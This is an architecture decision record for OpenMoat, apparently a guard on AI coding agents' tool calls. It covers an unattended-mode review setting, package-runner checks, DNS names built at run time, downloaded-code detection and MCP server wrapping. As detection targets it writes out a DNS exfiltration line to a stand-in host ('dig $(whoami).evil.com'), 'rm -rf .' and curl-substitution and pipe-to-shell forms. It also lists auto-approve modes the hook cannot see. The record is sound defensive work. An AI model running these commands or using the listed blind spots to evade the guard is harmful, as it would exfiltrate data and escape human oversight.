# ADR-100: An unattended profile, package runners, DNS names built at run time, and wrapping newly accepted MCP servers

Status: accepted · Date: 2026-11-14 · Builds on ADR-025 (`defer`), ADR-030 (package
near misses), ADR-032 (first sight), ADR-076 (`init` offers to wrap) · Amends ADR-076
decision 2 for servers accepted later

## Context

Since ADR-025 a call OpenMoat neither denies nor reviews is a `defer`: the agent's own
permission flow decides it, as it would without OpenMoat. That is the quiet default the
project chose, and it is right where that flow asks a person. Several agents have modes
in which it asks no one: Claude Code's `bypassPermissions` and `auto`, pi in print or JSON
mode, Hermes Agent's YOLO mode, Antigravity CLI's `always-proceed`, Cline's
`--auto-approve`, OpenCode 2's `--auto`. There a `defer` means "runs": an install of an
unknown package, `rm -rf .`, a GET to an unlisted host through a fetch tool, an MCP
repository delete. OpenMoat already turns a `review` into a deny that says how to approve
it where the host would approve it unseen (`Reviews::prompt_free_modes`,
`Reviews::unseen`), but nothing held the defers.

Three smaller gaps sat next to it. `npx`, `uvx`, `pipx run` and the other runners fetch a
package and run its code at once; the near-miss check of ADR-030 read only installs, so
`npx lodahs` and `uvx anything` deferred. No conformance fixture covered DNS exfiltration,
and a name built at run time (`dig $(whoami).evil.com`) carried no host, so it deferred
where `dig x.evil.com` was denied. The classifier audit of 2026-11-08 left three forms of
downloaded code open: `python3 -c "$(curl …)"`, `sh -c '$(curl …)'` (single quotes, the
inner shell expands it) and `find -exec`/`xargs` runs, which carried no outer substitutions.
And MCP wrapping (ADR-076) was offered only by `init`: a server added later started
unchecked until a person ran `openmoat mcp wrap`.

## Decision 1: `unattended:`, in the person's policy only

A new top-level key, `unattended: defer | review`, absent meaning `defer`:

- With `review`, a call whose decision is `defer` (not `ungoverned`), in a mode in which
  the agent runs such a call with no person asked, becomes a `review` with the new built-in
  rule `unattended` first among its rules. A `review` in such a mode is answered as
  `PreToolUseNoPrompt`: a deny that says how to approve it (`openmoat`, `openmoat allow
  --last`), or a request on the approvals channel (ADR-078), which can approve it from a
  phone. `allow` and `deny` are unchanged. Nothing changes with `defer`.
- Only the person's policy holds it. `RepoPolicy` rejects unknown keys, so a repository
  policy or a pack that names it does not parse (the call is then denied, `kernel-error`);
  a cloned repository cannot lower or raise it. It is lock-pinned like the rest of the file.
- The rule is OpenMoat's own (`rule_id::UNATTENDED`, worded for the block message, ADR-059).

**Which modes count** is a fact of each host's spec, from what the hook can see:

| Host | Detected from | Source |
|---|---|---|
| Claude Code | payload `permission_mode` in `Reviews::unattended_modes`: `bypassPermissions`, `auto` (`dontAsk` refuses what it would ask, so a defer does not run; `acceptEdits` asks before every call but an edit) | hooks reference, common input fields; settings reference `defaultMode`; `claude_code/settings.rs` `PROMPTING_MODES` |
| pi | the adapter's `has_ui: false` (print and JSON mode); pi has no approval step of its own | `pi/HOST.md`, extension `ctx.hasUI` |
| Hermes Agent | `Reviews::unseen`: `HERMES_YOLO_MODE`, `approvals.mode: off` and the unattended `approve` settings | `hermes/HOST.md` |
| Antigravity CLI | `Reviews::unseen`: `toolPermission: always-proceed` in `settings.json` (what `--dangerously-skip-permissions` sets) | `antigravity_cli/settings.rs` |

`HookRequest::unattended` carries it from the adapter to the guard; for the hosts whose
answer is read outside the payload, the guard reads it (`guard/unseen.rs`) only when the
policy says `review` and the decision is a `defer` or `review`, so the default costs no file
read. A contract test requires every host that can report such a mode to say why its review
becomes a deny there (`on_no_prompt`).

**Not detected**, because the hook is not shown it: Cline's `--auto-approve` (default on)
and `--yolo` (which runs no hooks at all); OpenCode 2's `--auto`; Codex's approval policy
`never` and `--dangerously-bypass-approvals-and-sandbox` (its payload's `permission_mode`
values in an auto-approve run are not documented); Gemini CLI's `--yolo` (a `review` there
still reaches the person, `gemini_cli/HOST.md`); GitHub Copilot CLI's `--allow-all-tools`;
goose's `GOOSE_MODE` when set in its `config.yaml`. For those `openmoat run` is the
boundary, and LIMITS.md says so. A host fact added later needs a source, as above.

**Default: `defer`, unchanged.** Under the default policy most of what an agent runs
defers (an install, a build tool the policy does not name, a fetch). With `review` every
one of them waits for a person in such a mode. For a run nobody watches (CI, a scheduled
job, `claude -p` with `bypassPermissions`) that is the point; for a person who turned the
agent's prompts off while watching, it is a stop on every unknown command, and changing the
default would break that workflow without asking. So the default stays, the CHANGELOG says
the key exists, and POLICY.md §5.4 and LIMITS.md recommend `review` wherever agents run
unattended. The default is revisited once `openmoat report` shows how many calls it would
hold in real sessions.

## Decision 2: package runners name what they fetch

`shell/installs/runs.rs` reads `npx`, `bunx`, `pnpx`, `npm exec`, `npm x`, `pnpm dlx`,
`yarn dlx`, `bun x`, `uvx`, `uv tool run` and `pipx run`: the package option's value
(`-p`/`--package`, `--from`, `--spec`; `uv`'s `--with` adds one), otherwise the first word
after the options. A near miss gives the existing `@package-near-miss` atom; any other name
not on the bundled popular list gives `@package-run-unknown <ecosystem> <name>`, which the
new default `review` group `package-run-unknown` names. A popular name gives no atom, so
`npx prettier` defers as before (the near-miss design of ADR-030: an atom for every run
would fall to the catch-all and change nothing but the noise). A version pin does not make
an unknown name known, so pinned or not is decided alike. `--no`, `--no-install` and
`--offline` fetch nothing and name nothing; `pnpm exec`, `yarn exec` and `uv run` run what
is installed and are not read. `openmoat allow --always` adds the run's atom to its rule, as
it does the near-miss one (`package_atoms`).

The cost: a local bin whose name is not a popular package (`npx tsc`, which without a local
TypeScript downloads the unrelated `tsc` package) needs one approval, or `npx --no-install
tsc`. That is the case the review is for: the hook cannot tell a local bin from a download.

## Decision 3: a host name built at run time, and more resolvers

For a program that names hosts, a word with an expansion whose fixed end is a host
(`$(whoami).evil.com`, `${X}.evil.com`, `x-$(id -u).evil.com`) is a `net` atom for that
end: the lookup goes to that domain's name server and carries the built part. `drill`,
`kdig`, `delv`, `getent` and `resolvectl` join `HOST_PROGRAMS`. A name with no fixed host
after its last expansion (`dig "$DOMAIN"`) is unchanged. This only adds `net` atoms where
a host program already named a host, so it only tightens; a variable bucket in a URL
(`curl https://$B.s3.amazonaws.com/x`) is now decided by its host, as the same URL without
the variable already was.

## Decision 4: the three open forms of downloaded code

A command substitution in the program's place (`$(curl URL)`, which also covers `sh -c
'$(curl URL)'`: the inner shell expands it), in an interpreter's inline code (`python3 -c
"$(curl URL)"`), and in the command `find -exec` or `xargs` runs (their outer
substitutions now reach the command, as a wrapper's did) emit the canonical `curl URL |
<program>` pipeline, so `pipe-to-shell` decides them. A substitution that prints a local
path (`$(git rev-parse --show-toplevel)/x.sh`) emits a pipeline no rule names, and the line
defers as before.

## Decision 5: MCP servers accepted later are offered wrapping, Enter for yes

`openmoat mcp accept` (and `doctor --accept`), after a person accepts a definition that is
new, asks the same question `init` asks about those servers, `Run them through OpenMoat?
[Y/n/d]`, Enter being yes; a no is remembered per definition as at `init`.

Wrapping is not turned on without a person, and not for existing servers, because it would
add work to normal sessions without anyone agreeing to it: a wrapped server's tools stay
hidden until `openmoat mcp accept` after its first start (ADR-032), a wrapped server does
not start inside `openmoat run` (ADR-049), and rewriting the person's agent files needs
the person (the "ask before change" rule of `init`). A new definition is already a point at
which the person must act: its calls are denied (`mcp-server-changed`) until they accept
it. Offering the wrap there adds one answer to a step they are taking anyway, and only for
the server they just added. A project's `.mcp.json` is still never rewritten (ADR-049).

## Consequences

- `unattended: review` closes "a `defer` runs in auto-approve modes" for the four hosts
  whose mode the hook sees; the rest are named in POLICY.md §5.4 and LIMITS.md.
- New fixtures: 15 DNS attacks, 6 downloaded-code attacks, 15 package-run reviews, and
  their benign neighbours; unit tests for each classifier change, the guard's unattended
  step, and an end-to-end test of `unattended: review` under Claude Code's modes, of a
  repository policy that names the key, and of `mcp accept` offering the wrap.
- Two existing fixtures change on purpose: `review-npm-exec-like-npx` (`npm exec tsc`)
  and `review-npm-x-like-npx` (`npm x cowsay`) deferred and now need review
  (`package-run-unknown`); both fetch and run a package not on the popular list, which is
  what decision 2 holds.
- `HookRequest` gains `unattended`; `Reviews` gains `unattended_modes`.
- `openmoat_core::package_near_misses` is now `package_atoms` and also returns the
  `@package-run-unknown` atoms.
